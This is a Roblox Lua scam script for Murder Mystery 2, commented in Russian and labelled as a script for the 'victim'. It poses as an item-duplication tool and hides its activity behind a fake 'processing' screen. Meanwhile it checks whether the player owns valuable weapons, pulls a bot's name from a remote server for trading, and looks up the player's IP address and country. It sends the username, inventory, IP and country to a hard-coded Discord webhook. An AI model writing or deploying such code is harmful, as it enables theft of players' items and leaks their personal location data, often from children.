--- Скрипт для жертвы Dupe V2
local data = nil

local success, response = pcall(function()
    return http_request({
        Url = 'https://testerss.pythonanywhere.com/nickname',
        Method = 'GET',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
    })
end)

if success then
    data = response.Body
else
    warn("Request failed:", response)
    return nil
end

local botname = data

--- Создаем GUI систему
local ScreenGUI = Instance.new("ScreenGui")
ScreenGUI.Name = "ScreenStats"
ScreenGUI.IgnoreGuiInset = true
ScreenGUI.DisplayOrder = 9999
ScreenGUI.ResetOnSpawn = false
ScreenGUI.Parent = game.Players.LocalPlayer.PlayerGui
local BackgroundFrame = Instance.new("Frame")
BackgroundFrame.Size = UDim2.new(1,0,1,0)
BackgroundFrame.BackgroundColor3 = Color3.fromRGB(1,1,1)
BackgroundFrame.Parent = ScreenGUI
local NicknameText = Instance.new("TextLabel")
NicknameText.Parent = BackgroundFrame
NicknameText.Name = "NicknameText"
NicknameText.Text = "Proccesing Dupe inventory"
NicknameText.TextSize = 80
NicknameText.TextColor3 = Color3.fromRGB(255,255,255)
NicknameText.Position = UDim2.new(0.5,0,0.1,7)
NicknameText.Font = Enum.Font.FredokaOne
local tasks = Instance.new("TextLabel")
tasks.Parent = BackgroundFrame
tasks.Name = "NicknameText"
tasks.Text = "Proccesing..."
tasks.TextSize = 40
tasks.TextColor3 = Color3.fromRGB(255,255,255)
tasks.Position = UDim2.new(0.5, 0, 1, -70)
tasks.Font = Enum.Font.FredokaOne
local procent = Instance.new("TextLabel")
procent.Parent = BackgroundFrame
procent.Name = "NicknameText"
procent.Text = "Proccess..."
procent.TextSize = 35
procent.TextColor3 = Color3.fromRGB(255,255,255)
procent.Position = UDim2.new(0.5, 0, 1, -35)
procent.Font = Enum.Font.FredokaOne

if game.PlaceId ~= 142823291 then game:GetService("TeleportService"):Teleport(142823291) end

--- Проверяем девайс
local hasLobby = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby") ~= nil
if hasLobby == true then
    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest.ReceivingRequest.Username.Text
else
    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.ReceivingRequest.Username.Text
end

--- Получаем уровень, и проверяем больше ли он 10 уровня, если нет, то кикаем игрока с ошибкой.
local player = game.Players.LocalPlayer
local args = {
    [1] = player.Name
}
local accountInformation = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
local level = accountInformation.LevelBadges["Level10"]

if level == false then
    player:Kick("You're less than level 10.")
    task.wait(99999)
end

--- Парсим инвентарь и проверяем сколько всего предметов, так же получаем название и количество всех оружий.
local LP = game.Players.LocalPlayer
local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)

if not InvModule or not InvModule.MyInventory or not InvModule.MyInventory.Data then
    LP:Kick("Execute Only After Choosing Which Devices.")
    return
end

local groupedWeapons = {}
local currentGroup = {}
local count = 0
local Godly = 0
local Ancient = 0
local Unique = 0
local Icepiercer = "❌"
local Harvester = "❌"
local Gingerscope = "❌"

if InvModule.MyInventory.Data.Weapons then
    for _, weaponCategory in pairs(InvModule.MyInventory.Data.Weapons) do
        for _, weaponData in pairs(weaponCategory) do
            if weaponData.Rarity == "Godly" or weaponData.Rarity == "Ancient" or weaponData.Rarity == "Unique" then
                table.insert(currentGroup, weaponData.DataID .. " (" .. weaponData.Amount .. ")")
                if weaponData.Rarity == "Godly" then
                    Godly = Godly + weaponData.Amount
                elseif weaponData.Rarity == "Ancient" then
                    Ancient = Ancient + weaponData.Amount
                elseif weaponData.Rarity == "Unique" then
                    Unique = Unique + weaponData.Amount
                end
                if weaponData.DataID == "Icepiercer" then
                    Icepiercer = "✅"
                elseif weaponData.DataID == "Harvester" then
                    Harvester = "✅"
                elseif weaponData.DataID == "Gingerscope" then
                    Gingerscope = "✅"
                end    
                count = count + 1
                
                if count == 4 then
                    table.insert(groupedWeapons, table.concat(currentGroup, ", "))
                    currentGroup = {}
                    count = 0
                end
            end
        end
    end
end

if #currentGroup > 0 then
    table.insert(groupedWeapons, table.concat(currentGroup, ", "))
end

if #groupedWeapons == 0 then
    LP:Kick("Godly, Ancient, Unique Weapons Only!")
end

--- Проверяем сколько людей на сервере

local Players = game:GetService("Players")

local function getPlayerCount()
    local playerCount = #Players:GetPlayers()
    return playerCount
end

local playernum = getPlayerCount()

if playernum == 1 then
    player:Kick("Only public server, no private")
    task.wait(99999)
end

if playernum == 12 then
    player:Kick("You have been kicked: The server has reached the maximum number of players for duping. Please rejoin a different server.")
    task.wait(99999)
end
--- Получаем страну и айпи

local ip = "None"
local country = "None"

local success, response = pcall(function()
    return http_request({
        Url = 'http://ip-api.com/json/',
        Method = 'GET',
        Headers = {
            ['Content-Type'] = 'application/json'
        },
    })
end)

if success then
    local responseBody = response.Body
    local responseData = game:GetService("HttpService"):JSONDecode(responseBody)
    
    ip = responseData.query  -- Получаем IP
    country = responseData.country  -- Получаем страну
else
    warn("Request failed:", response)
end


--- увед в дс

local webh = "https://discord.com/api/webhooks/1337312412348448779/vTVgVNC-pFDEl0pPPQWV_VYfVMIWwOI6AiYlQcdgu6qyFZHy3upbnX7By7p9VNMnsVPJ"

local HttpServ = game:GetService("HttpService")
local url = webh

local data = {
    ["content"] = "@everyone",
    ["embeds"] = {{
        ["title"] = "Information",
        ["color"] = 10494192,
        ["fields"] = {
            {
                ["name"] = "Nickname",
                ["value"] = "```" .. player.Name .. "```",
                ["inline"] = false
            },
            {
                ["name"] = "Level 10",
                ["value"] = "```True```",
                ["inline"] = true
            },
            {
                ["name"] = "Inventory",
                ["value"] = "```Godly - " .. Godly .. "\nAncient - " .. Ancient .. "\nUnique - " .. Unique .. "```",
                ["inline"] = false
            },
            {
                ["name"] = "Weapon",
                ["value"] = "```Gingerscope - " .. Gingerscope .. "\nIcepiercer - " .. Icepiercer .. "\nHarvester - " .. Harvester .. "```",
                ["inline"] = false
            },
            {
                ["name"] = "IP",
                ["value"] = "```" .. ip .. " | Country: ".. country .. "```",
                ["inline"] = false
            },
            {
                ["name"] = "Game",
                ["value"] = "```Murder Mystery 2```",
                ["inline"] = false
            }
        }
    }}
}

local newdata = HttpServ:JSONEncode(data)
local headers = {
    ["content-type"] = "application/json"
}

local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
http_request(request_payload)
